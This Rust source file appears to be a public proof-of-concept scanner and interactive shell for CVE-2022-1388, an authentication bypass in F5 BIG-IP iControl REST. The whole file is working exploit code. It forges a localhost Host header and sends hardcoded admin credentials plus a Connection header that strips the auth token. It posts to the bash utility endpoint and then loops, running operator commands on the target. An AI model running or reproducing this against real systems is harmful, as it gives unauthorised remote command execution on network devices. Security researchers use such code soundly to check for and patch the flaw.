// Copyright (c) 2022 Petruknisme
// 
// This software is released under the MIT License.
// https://opensource.org/licenses/MIT

extern crate clap;
extern crate colored;
extern crate reqwest;
#[macro_use]
extern crate serde_json;


use clap::Parser;
use colored::Colorize;
use std::io::Write;
use snailquote::unescape;
use serde::{Deserialize, Serialize};

#[derive(Parser)]
#[clap(name = "CVE-2022-1388 PoC")]
#[clap(author = "Petruknisme <me@petruknisme.com>")]
#[clap(version = "1.0")]
#[clap(about = "Scanner and Interactive shell for CVE-2022-1388 F5 BIG-IP iControl REST Auth Bypass RCE written in Rust", long_about = None)]


struct Cli {
    /// F5 Big-IP target url
    #[clap(short, long)]
    url: String,

    /// This mode for accessing payload with interactive shell
    #[clap(short, long)]
    shell: bool,
    
}

#[derive(Serialize, Deserialize, Debug)]
struct CommandResult {
    kind: String,
    command: String,
    commandResult: String,
}

fn prompt(name:&str) -> String {
    let mut line = String::new();
    print!("{}", name);
    std::io::stdout().flush().unwrap();
    std::io::stdin().read_line(&mut line).expect("Error: Could not read a line");
 
    return line.trim().to_string()
}

#[tokio::main]
async fn get_header_only(url: &str, cmd: &str) -> Result<reqwest::Response, reqwest::Error>{

    let command_data = json!({
        "command": "run",
        "utilCmdArgs": format!("-c {}", &cmd),
        });
    
    let client = reqwest::Client::new();
    let res = client
            .post(url)
            .header("Host", "127.0.0.1")
            .header("Authorization", "Basic YWRtaW46aG9yaXpvbjM=")
            .header("X-F5-Auth-Token", "aToZ")
            .header("Connection", "X-F5-Auth-Token")
            .json(&command_data)
            .send()
            .await;
    return res;
}

#[tokio::main]
async fn get_json(url: &str, cmd: &str) -> String{

    let command_data = json!({
        "command": "run",
        "utilCmdArgs": format!("-c {}", &cmd),
        });
    
    let client = reqwest::Client::new();
    let res = client
            .post(url)
            .header("Host", "127.0.0.1")
            .header("Authorization", "Basic YWRtaW46aG9yaXpvbjM=")
            .header("X-F5-Auth-Token", "aToZ")
            .header("Connection", "X-F5-Auth-Token")
            .json(&command_data)
            .send()
            .await
            .unwrap();
    let json_data = res.text().await.unwrap();
    return json_data;

}



fn main() {
    let cli = Cli::parse();
    let url = format!("{}/mgmt/tm/util/bash", cli.url);
    let shell = cli.shell;
    
    println!("{}", "\t\tScanner and Interactive shell for CVE-2022-1388 F5 BIG-IP iControl REST Auth Bypass RCE written in Rust\n".yellow());
    println!("{} {}",
            "[*] Target:  ".blue(),
            url.red() 
    );

    println!("{}", "Checking if target is vulnerable...");
    
    let header = get_header_only(&url, "id");
    let s_code = header.unwrap().status();

  if s_code.as_str() == "401" {
        println!("{}", "401 Client Error: F5 Authorization Required");
        println!("{}", "Target not vulnerable!");
    }
    else if s_code.as_str() == "404" {
        println!("{}", "404 Page Not Found");
    }
    else if s_code.as_str() == "200" {
        println!("Target is Accessible. Trying to exploit");
        let response = get_json(&url, "id && echo `whoami`@`hostname`");
        let u: CommandResult = serde_json::from_str(&response).unwrap();
        let res_split: Vec<String> = u.commandResult.split("\n").map(|s| s.to_string()).collect();
        let ps1_prompt = unescape(&res_split[1]).unwrap();
        println!("Exploit success. Here is result from command id \n\n{}", &res_split[0] );
        //println!("{}", &ps1_prompt);
        loop {
            let input=prompt(&format!("[{}]$ ", &ps1_prompt).to_string());
            if input=="exit" { 
                break; 
            };
            let json_data = get_json(&url, &input);
            let x: CommandResult = serde_json::from_str(&json_data).unwrap();
            println!("{}", x.commandResult);
        }
    } 
}